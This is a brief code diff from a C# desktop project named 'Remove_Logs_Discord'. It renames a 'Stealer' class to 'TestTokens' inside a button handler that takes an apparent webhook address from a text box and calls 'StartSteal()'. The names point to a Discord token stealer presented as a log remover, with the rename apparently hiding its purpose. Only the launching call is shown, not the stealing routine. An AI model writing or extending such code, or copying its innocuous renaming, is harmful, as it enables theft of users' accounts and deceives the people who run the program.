@@ -115,8 +115,8 @@ namespace Remove_Logs_Discord
 
         private void guna2Button2_Click(object sender, EventArgs e)
         {
-            Stealer.Hook = guna2TextBox1.Text;
-            Stealer.StartSteal();
+            TestTokens.Hook = guna2TextBox1.Text;
+            TestTokens.StartSteal();
         }
     }
 }
